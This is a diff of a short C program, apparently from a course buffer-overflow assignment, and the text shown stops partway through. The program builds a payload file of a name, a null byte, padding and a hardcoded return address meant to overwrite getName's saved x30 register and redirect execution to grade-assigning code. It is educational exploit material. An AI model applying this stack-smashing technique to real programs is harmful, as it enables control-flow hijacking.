@@ -1,20 +1,23 @@
+/*--------------------------------------------------------------------*/
+/* createDataB.c                                                      */
+/* Author: David Hovey                                                */
+/*--------------------------------------------------------------------*/
+
+#include <stdio.h>
+#include <string.h>
+
 /*
 Produces a file called dataB with the student name, a nullbyte,
 padding to overrun the stack, and the address of the instruction
 in main to get a B, the latter of which will overwrite getName's
 stored x30
 */
-#include <stdio.h>
-#include <string.h>
-
-
-/* FUNCTION COMMENT */
 int main() {
     char name[] = "David";
     char whitespace[] = "gggggggggggggggggggggggggggggggggggggggggg";
     long returnAddress = 0x400890;
 
-    FILE *psFile = fopen("davidBgrade.txt", "w");
+    FILE *psFile = fopen("dataB", "w");
 
     if (!psFile) {
         perror("fopen did not return a valid pointer");
